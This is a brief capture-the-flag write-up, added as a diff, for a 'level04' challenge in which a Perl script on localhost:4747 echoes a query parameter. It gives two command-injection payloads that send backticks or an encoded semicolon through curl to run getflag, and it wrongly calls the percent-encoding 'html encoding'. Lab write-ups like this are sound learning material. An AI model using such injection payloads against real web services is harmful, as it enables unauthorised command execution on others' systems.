@@ -1,0 +1,12 @@
+cat the level04.pl
+
+you notice the locahost:4747
+which call the /var/www and have right of flag04
+if you read the code you see that x = param result echoed
+
+using a curl localhost:4747?x=\`getflag\`
+get you the flag
+
+alternate curl localhost:4747?x='%3Bgetflag'
+%3B = ; in html encoding 
+escaping echo to launch the other command
